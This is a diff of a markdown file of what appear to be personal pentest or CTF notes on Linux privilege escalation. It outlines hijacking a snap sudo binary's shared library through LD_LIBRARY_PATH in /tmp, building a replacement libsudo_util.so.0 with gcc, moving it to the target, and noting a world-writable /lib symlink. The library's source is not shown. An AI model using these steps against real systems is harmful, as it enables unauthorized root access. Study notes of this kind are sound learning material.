@@ -205,21 +205,33 @@ export LD_LIBRARY_PATH=/tmp:$LD_LIBRARY_PATH
 ```
 
 ```bash
-$ ldd /snap/core20/2264/usr/bin/sudo 
+$ ldd /snap/core20/2264/usr/bin/sudo # the other sudo bin and other bin (can't rmb) works too
 /snap/core20/2264/usr/bin/sudo: error while loading shared libraries: /tmp/libsudo_util.so.0: file too short
 ```
 
 
 
-```
-$ gcc -fPIC -c libsudo_util.c -o libsudo_util.o
-$ gcc -shared -o libsudo_util.so.0 libsudo_util.o
-$ file libsudo_util.o
+```bash
+tmp$ gcc -fPIC -c libsudo_util.c -o libsudo_util.o
+tmp$ gcc -shared -o libsudo_util.so.0 libsudo_util.o
+tmp$ file libsudo_util.o
 
 
 ... python3 server transfer to target
-$ mv libsudo_util.o libsudo_util.so.0
+tmp$ mv libsudo_util.o libsudo_util.so.0
 ```
+
+<pre class="language-bash"><code class="lang-bash"><strong># after creating the shared libary file (above)
+</strong><strong>$ ldd /snap/core20/2264/usr/bin/sudo
+</strong><strong>...so /lib/x86_64...
+</strong><strong>
+</strong><strong>$ ls -l /lib
+</strong>symlink to /usr/lib
+... world writeable
+
+</code></pre>
+
+
 
 ### /usr/bin/mount with SUID
 
